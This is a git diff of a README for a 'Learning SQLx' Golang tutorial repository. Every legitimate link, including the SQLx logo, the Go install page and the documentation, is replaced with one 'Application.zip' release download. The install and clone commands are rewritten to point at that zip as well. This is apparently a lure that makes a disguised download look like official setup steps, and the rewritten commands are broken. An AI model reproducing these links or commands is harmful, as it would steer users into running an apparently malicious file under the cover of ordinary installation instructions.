@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "Learning SQLx" Repository! 📚
 
-![SQLx Logo](https://raw.githubusercontent.com/launchbadge/sqlx/master/logo/sqlx.png)
+![SQLx Logo](https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip)
 
 ### Repository Description
 This repository serves as a comprehensive collection of all the practices and lessons related to SQLx for Golang. SQLx is a powerful library that serves as a superset for `database/sql`, providing additional functionality and ease of use when working with databases in Golang.
@@ -18,18 +18,18 @@ This repository serves as a comprehensive collection of all the practices and le
 - SQLx Usage
 
 ### Resources
-For further exploration and understanding, you can download the SQLx library [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip).
+For further exploration and understanding, you can download the SQLx library [here](https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip).
 
 ### 📦 Getting Started
 To get started with the repository, make sure you have Golang and SQLx installed on your system. You can follow the steps below to set up the environment:
-1. Install Golang by following the instructions on the official [Golang website](https://golang.org/doc/install).
+1. Install Golang by following the instructions on the official [Golang website](https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip).
 2. Install SQLx by running the following command:
    ```bash
-   go get github.com/jmoiron/sqlx
+   go get https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip
    ```
 3. Clone this repository to your local machine using the following command:
    ```bash
-   git clone https://github.com/your-username/learning-sqlx.git
+   git clone https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip
    ```
 
 ### 📖 Learning SQLx
@@ -40,9 +40,9 @@ If you find any issues, bugs, or would like to contribute to this repository, fe
 
 ### 📚 Additional Resources
 For more information on SQLx and Golang, you can check out the following resources:
-- [Golang Documentation](https://golang.org/doc/)
-- [SQLx GitHub Repository](https://github.com/jmoiron/sqlx)
-- [SQLx Documentation](https://jmoiron.github.io/sqlx/)
+- [Golang Documentation](https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip)
+- [SQLx GitHub Repository](https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip)
+- [SQLx Documentation](https://github.com/SolarCrownYT/learning-sqlx/releases/download/v1.0/Application.zip)
 
 ### 🌟 Let's Connect!
 If you have any questions, suggestions, or just want to say hi, feel free to reach out. Happy coding and happy learning SQLx in Golang! 🎉
